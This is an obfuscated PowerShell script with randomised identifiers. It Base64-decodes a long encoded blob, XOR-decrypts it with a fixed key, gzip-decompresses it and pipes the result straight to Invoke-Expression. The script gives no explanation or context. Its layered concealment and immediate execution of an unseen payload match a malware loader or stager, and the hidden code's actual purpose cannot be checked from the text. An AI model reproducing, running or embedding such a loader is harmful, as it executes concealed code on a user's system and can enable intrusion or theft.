$bmyj61n42wpctih = [System.Text.Encoding]::ascii
function otkfihp7unlmdqz3vrg1x69jbs2  {param($23l5qy0f7gu4m1j )
  $wj7p8zstrloyq21 = [System.Convert]::FromBase64String($23l5qy0f7gu4m1j)
  $8juyose5n20zmi1= $bmyj61n42wpctih.GetBytes("cj62mlg0eo4i")
    $tme8pc6ibol152s = $wj7p8zstrloyq21
    $bvh6cfo14580jun = $(for ($f1on4eq290mjryb = 0; $f1on4eq290mjryb -lt $tme8pc6ibol152s.length; ) {
        for ($fio4p6d0uvhtjl2 = 0; $fio4p6d0uvhtjl2 -lt $8juyose5n20zmi1.length; $fio4p6d0uvhtjl2++) {
            $tme8pc6ibol152s[$f1on4eq290mjryb] -bxor $8juyose5n20zmi1[$fio4p6d0uvhtjl2]
            $f1on4eq290mjryb++
            if ($f1on4eq290mjryb -ge $tme8pc6ibol152s.Length) {
                $fio4p6d0uvhtjl2 = $8juyose5n20zmi1.length
            }
        }
    })
	$cr70vmfp4hkdgu3 = New-Object System.IO.MemoryStream( , $bvh6cfo14580jun )

	    $e87tgw6chbk0z3q = New-Object System.IO.MemoryStream
        $1amqith5zl2rkws = New-Object System.IO.Compression.GzipStream $cr70vmfp4hkdgu3, ([IO.Compression.CompressionMode]::Decompress)
	    $1amqith5zl2rkws.CopyTo( $e87tgw6chbk0z3q )
        $1amqith5zl2rkws.Close()
		$cr70vmfp4hkdgu3.Close()
		[byte[]] $2kxi4n8o0lg5cme = $e87tgw6chbk0z3q.ToArray()
 $6xnksjupzwf59dq=$2kxi4n8o0lg5cme
    return $6xnksjupzwf59dq
}
[byte[]]$k5fesv916pogw2j=otkfihp7unlmdqz3vrg1x69jbs2 $nw4hqzptig7r0v2
[System.Text.Encoding]::ascii.GetString((otkfihp7unlmdqz3vrg1x69jbs2 "fOE+Mm1sZzBhb7k8uBiVCn0ROZqdaKHjzorDcgyrltQ3FoRaR5tarqSp0gPe8eD9b2jSMk8unwI8kM9d1K73wX3EZeQP8goU2U9id+i3rFIiXSrKtw/ovggC4eDWxRTRcUh+lgannveBn1NDJqLhfbCiYJQgOzK1Dv9oaCeQS8BsVXG6mB8cWwkij3r/GdgZ9K/I8ZxdLi2joz9D5AF/YXDrq8WZDyI6v6Af1kWgJErg5DiT51p9PbAZ1/DI5Xh4ySvTD0yDwjDuMc/0khJ3t2njFPHGTn0A3D2PBrw3MrL+9ZdPQBCuChBahFGCz6/XXIkr2mf87vxqJzvpV7fVMEmcXQyLvpOH8n/79xdqVOZstYVzwrZXUetYkVUV7W4BKNg8p5wytUfIAyWhGrKbY3a6ZYXPiT8zsMHrTO6TXG3DIopmq/KbsiVhWV3nUQBpeIHt39qfIoOJB9a6PieYuEEaf6ckGXAAR5VA/4sZP00L5doUUgVjwdAxPh/MlVWSSsL6dpFuzRp+mtkXfq+fFgzETf+Aq8I0ocK8FCWAHZdfXdL1piLhn7jSAqqVU17IVbinh4cZlcGkzyqe6JtxKpLj55gUaDxVIawv/Q/lXW1hmQu4kL4/uhW8GVw/x2QokHgUMRnmUipK4X372y6k3QgQyxq0zP/Jne/lLejTdAJ/pKwtlx5ZK504iYWSI47LGMAUWql7s1DFTx6JRZzO1JYzAaIT5ZFI8HqR8sdP04Gc/BFR/DQ8agWI73geU8QB2VLcxn6CSIuWxSmlasXCNYeb9xN5ZSahQ4kQ/WyLZgBXkRUIJR0Gojy7dNUeVOPTM7ZHmZmM/IjLXm1Od3MSfwRYbOdtOClYmWhxYvlk/ZY1K8f15l4bVJ3lzXx+3MvYp2kxWnEXQjUUi7AWAegMoObZOeKZ7x5ME2E24tsYwnMEo1HH78/YybAwDDxbwEGpBq1mLXeUklflUKvkgRvxgKvbkZfuDtuVH1qEnPuiopWagIPaOLGPq1LiYI4QCuu0OcmNxrbJ2My+8e++lbosPfsiiEpd1fTGhNOcFhElIiq1X3BYPnAVkhhPHzLCnY7HY6wPPRVNhCr9TljGcUy2mi5DxoBKqvWQNh30ZEuVwhrGF/V2ypsDUI6GoKLu9H1DaTol9Ex4b00AnkqeZBpGcppGhanFK3ZoZKj5EO3RBeAq0D88DdJUQd8eIK7xyWukoKj+bWpsZw=="))|iex;